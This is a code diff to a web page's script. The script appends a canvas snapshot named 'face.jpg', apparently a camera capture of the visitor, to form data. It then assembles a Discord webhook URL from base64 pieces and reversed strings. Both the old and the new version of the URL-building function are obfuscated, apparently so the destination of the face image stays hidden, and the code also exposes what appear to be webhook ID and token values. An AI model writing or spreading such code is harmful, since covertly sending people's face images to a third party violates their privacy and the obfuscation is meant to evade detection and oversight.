@@ -249,16 +249,22 @@
             formData.append('files[0]', await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85)), 'face.jpg');
 
             const webhookUrl = (function(){
-  const _0x = atob.bind(null);
-  const a = _0x("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv");
-  const b = "1469315318848426045".split('').reverse().join('');
-  const c = _0x("NzY0U3g5Y2pJaFJtSWtCOG1vZUVKblE3Z3NVNmo=") + "35tnnonGniOXWb2vJ04hOiRu7lJRbEeS97BDPjQ";
-  const d = [47].map(String.fromCharCode).join('');
-  const junk = Math.random().toString(36).slice(2,8); // 毎回変わるゴミ
+            const _ = atob;
+            const p = [
+            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv", // https://discord.com/api/webhooks/
+            "NTQwNjI0ODQ4ODEzNTM5NjQx",                     // ID（逆順前）
+            "NzY0U3g5Y2pJaFJtSWtCOG1vZUVKblE3Z3NVNmo=",     // token part
+            "35tnnonGniOXWb2vJ04hOiRu7lJRbEeS97BDPjQ"
+            ];
 
-  let x = a + b.split('').reverse().join('') + d;
-  x += c.replace(/=+$/, '').split('').reverse().join('').split('').reverse().join('');
-  return x.replace(new RegExp(junk, 'g'), '');
+           const slash = String.fromCharCode(47);
+
+           let url = _(p[0]); 
+  url += p[1].split('').reverse().join('');          
+  url += slash;
+  url += (_(p[2]) + p[3]).replace(/=+$/, '');
+
+  return url;
 })();
     </script>
 </body>
